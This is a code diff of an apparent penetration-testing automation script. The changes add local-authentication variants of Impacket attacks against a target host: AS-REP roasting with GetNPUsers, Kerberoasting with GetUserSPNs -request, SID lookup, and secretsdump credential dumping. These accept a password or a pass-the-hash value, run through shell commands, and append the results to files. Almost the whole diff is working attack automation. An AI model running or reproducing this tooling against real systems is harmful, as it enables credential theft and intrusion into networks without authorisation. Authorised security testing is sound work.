@@ -60,6 +60,8 @@ cruh = f"{RHOST or FILE} -u {USERNAME} -H {HASH}"
 smbarg = "--shares --groups --users --sessions --computers --pass-pol"
 i = f"{DOMAIN}/{USERNAME}:{PASSWORD}@{RHOST}"
 ih = f"{DOMAIN}/{USERNAME}@{RHOST} --hashes {HASH}"
+iwd = f"/{USERNAME}:{PASSWORD}@{RHOST}"
+iwdh = f"/{USERNAME}@{RHOST} --hashes {HASH}"
 inp = f"impacket-GetNPUsers {i}"
 inph = f"impacket-GetNPUsers {ih}"
 ispn = f"impacket-GetUserSPNs {i}"
@@ -68,6 +70,14 @@ isid = f"impacket-lookupsid {i}"
 isidh = f"impacket-lookupsid {ih}"
 isec = f"impacket-secretsdump {i}"
 isech = f"impacket-secretsdump {ih}"
+linp = f"impacket-GetNPUsers {iwd}"
+linph = f"impacket-GetNPUsers {iwdh}"
+lispn = f"impacket-GetUserSPNs {iwd}"
+lispnh = f"impacket-GetUserSPNs {iwdh}"
+lisid = f"impacket-lookupsid {iwd}"
+lisidh = f"impacket-lookupsid {iwdh}"
+lisec = f"impacket-secretsdump {iwd}"
+lisech = f"impacket-secretsdump {iwdh}"
 
 print(f"{RED}\n****REMEMBER TO RUN WITH DOMAIN NAME IF YOU ARE USING A DOMAIN USER****\n{RESET}")
 time.sleep(3)
@@ -105,8 +115,7 @@ def SMBUP():
                 word = f"{Z}"
                 content = f.read()
                 if word in content:
-                    print(f"{Z} on SMB")
-
+                    print(f"{RED}{Z} on SMB{RESET}")
 def RDPUP():
     t = "RDP.txt"
     with open ("ports.txt", "r") as f:
@@ -276,7 +285,7 @@ def SMBH():
                 word = f"{Z}"
                 content = f.read()
                 if word in content:
-                    print(f"{Z} on SMB")
+                    print(f"{RED}{Z} on SMB{RESET}")
 def RDPH():
     t = "RDP.txt"
     with open ("ports.txt", "r") as f:
@@ -441,6 +450,25 @@ def IMPACKETADUP():
     print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
     s = Popen([f"{isec} >> secrets.txt"], shell=True)
     s.wait()
+    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{inp} >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{MAGENTA}Trying with local authentication{RESET}")
+    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{linp} >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{lispn} -request >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{lisid} >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
+    s = Popen([f"{lisec} >> secrets.txt"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{linp} >> {t}"], shell=True)
+    s.wait()
     with open ("Impacket.txt", "r") as f:
         content = f.read()
         print(content)
@@ -461,6 +489,19 @@ def IMPACKETADH():
     s.wait()
     print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
     s = Popen([f"{isech} >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{MAGENTA}Trying with local authentication{RESET}")
+    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{linph} >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{lispnh} -request >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
+    s = Popen([f"{lisidh} >> {t}"], shell=True)
+    s.wait()
+    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
+    s = Popen([f"{lisech} >> {t}"], shell=True)
     s.wait()
     with open ("Impacket.txt", "r") as f:
         content = f.read()
